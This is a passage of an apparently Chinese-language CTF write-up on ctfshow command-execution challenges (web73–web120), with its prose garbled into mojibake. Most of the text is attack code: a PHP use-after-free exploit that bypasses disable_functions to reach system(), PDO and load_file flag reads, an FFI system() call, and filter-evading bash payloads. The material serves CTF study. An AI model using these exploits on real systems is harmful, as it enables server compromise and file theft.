class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">str_user</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">str_user</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flagc.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯ä¸è¡Œï¼ŒæŠ¥é”™åŸå› æ˜¯æ•´æ•°æº¢å‡º</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73.png" alt=""></p><p>ç»§ç»­ä¿®æ”¹<code>strlen</code>çš„æ›¿æ¢å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_user</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">100000</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$ret</span>++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯ç”±äºæ•°æ®é•¿åº¦å¤ªé•¿ï¼Œå¯¼è‡´å‘é€ä¸è¿‡å»ï¼Œåªèƒ½æ¢ä¸ªæ–¹æ³•</p><p>æœ€ç»ˆpayloadï¼š<code>c=include(&quot;/flagc.txt&quot;);exit();</code> ï¼ˆæƒ³ä¸åˆ°includeå¯ä»¥ç”¨äº†ï¼‰</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74()"></a>web74()</h1><p>å…ˆç”¨<code>glob://</code>å°†æ–‡ä»¶æ‰¾å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>åœ¨åˆ©ç”¨<code>include</code>å°†flagè¯»å–å‡ºæ¥</p><p><code>payload: c=include(&#39;/flagx.txt&#39;);exit();</code></p><h1 id="web75-PDO"><a href="#web75-PDO" class="headerlink" title="web75(PDO)"></a>web75(PDO)</h1><p>æ“ä½œåŒä¸Š</p><p>å…ˆç”¨<code>glob://</code>å°†æ–‡ä»¶æ‰¾å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è¿˜é€šè¿‡<code>include_path</code>é™åˆ¶äº†æ–‡ä»¶åŒ…å«çš„è·¯å¾„ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨<code>include</code>åŒ…å«å¾—åˆ°flagä¿¡æ¯</p><p>è¿™æ—¶å€™éœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨PDOé“¾æ¥ï¼Œä½†æ˜¯éœ€è¦çŸ¥é“æ•°æ®åº“åç­‰ä¿¡æ¯ï¼Œåˆ©ç”¨å¦‚ä¸‹ä»£ç å¾—åˆ°æ•°æ®åº“ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ•°æ®åº“</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/75.png" alt=""></p><p>ä½¿ç”¨<code>load_file</code>å‡½æ•°è¯»å–flagæ–‡ä»¶å³å¯è·å–flagä¿¡æ¯</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h1 id="web76"><a href="#web76" class="headerlink" title="web76()"></a>web76()</h1><p>æ“ä½œåŒä¸Š</p><p>paylaodï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h1 id="web77-FFI"><a href="#web77-FFI" class="headerlink" title="web77(FFI)"></a>web77(FFI)</h1><p>ä¾æ—§æ˜¯åˆ©ç”¨<code>glob://</code>è¯»å–æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨PDOè¯»å–æ–‡ä»¶ï¼Œå‘ç°mysqlä¸è®©ç”¨äº†</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77.png" alt=""></p><p>è¿™é‡Œç›´æ¥ç”¨èšå‰‘è¿æ¥ï¼Œç›´æ¥æŸ¥çœ‹çš„è¯æ˜¯ä¸è¡Œ</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77_01.png" alt=""></p><p>çœ‹äº†æç¤ºå‘ç°æ˜¯ä¸ªæ–°ç‰¹æ€§ï¼Œè¿™é‡Œæ¨èä¸€ç¯‡æ–‡ç« </p><ul><li><a href="https://www.php.cn/faq/415807.html">PHP7.4ä¸­FFIçš„ä»‹ç»</a></li></ul><p>ä¹‹å‰è¯»çš„æ˜¯<code>.txt</code>æ–‡ä»¶ï¼Œè¿™æ¬¡æ”¹æˆ<code>*</code>ï¼Œå‘ç°å¦‚ä¸‹æ–‡ä»¶</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/77_02.png" alt=""></p><p>ç›´æ¥è¯»flagæ–‡ä»¶è¯»ä¸äº†ï¼Œè€ƒè™‘é…åˆFFIä½¿ç”¨<code>readflag</code>è¿›è¡Œè¯»å–</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag&gt;/var/www/html/1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œåè®¿é—®1.txtæ‹¿åˆ°flag</p><h1 id="web118-ç³»ç»Ÿå˜é‡"><a href="#web118-ç³»ç»Ÿå˜é‡" class="headerlink" title="web118(ç³»ç»Ÿå˜é‡)"></a>web118(ç³»ç»Ÿå˜é‡)</h1><p>é¢˜ç›®æç¤º</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118_02.png" alt=""></p><p>æ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªå¯ä»¥è¾“å…¥çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤º</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118.png" alt=""></p><p>å‘ç°å¯ä»¥ç”¨é€šè¿‡è¾“å…¥æŒ‡ä»¤æ¥æ‰§è¡Œã€‚å°è¯•è¾“å…¥<code>whoami</code>ï¼Œå‘ç°å›æ˜¾</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/118_01.png" alt=""></p><p>å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨fuzzå¤§æ³•è·‘ï¼Œå‘ç°å¯ä»¥ç”¨<code>A-Z</code>å’Œ<code>$&#123;&#125;~.?:</code></p><p>å°±å¯ä»¥åˆ©ç”¨ç³»ç»Ÿå˜é‡æ„é€ <code>nl</code>å‘½ä»¤ï¼Œæ ¹æ®é¢˜ç›®æç¤ºå‘ç°flagåœ¨flag.phpä¸­ï¼Œç›´æ¥æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;<span class="variable">$IFS</span>????.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;æ˜¯nl</span><br></pre></td></tr></table></figure><h1 id="web119"><a href="#web119" class="headerlink" title="web119()"></a>web119()</h1><p>å‘ç°å¦‚ä¸Šç•Œé¢ï¼Œä½†æ˜¯æœ¬é¢˜ç¦ç”¨äº†<code>$&#123;PATH</code></p><p>payloadï¼š<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span></span><br><span class="line"><span class="comment"># pwd=/var/www/html</span></span><br><span class="line"><span class="comment"># USER=www-data</span></span><br><span class="line"><span class="comment"># payloadå³ä¸º /???/?at ????.???</span></span><br><span class="line">ä¸ºäº†æ„é€ /bin/cat </span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥åªè¦aè¿›è¡Œæ„é€ </span><br><span class="line">$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><h1 id="web120"><a href="#web120" class="headerlink" title="web120()"></a>web120()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">     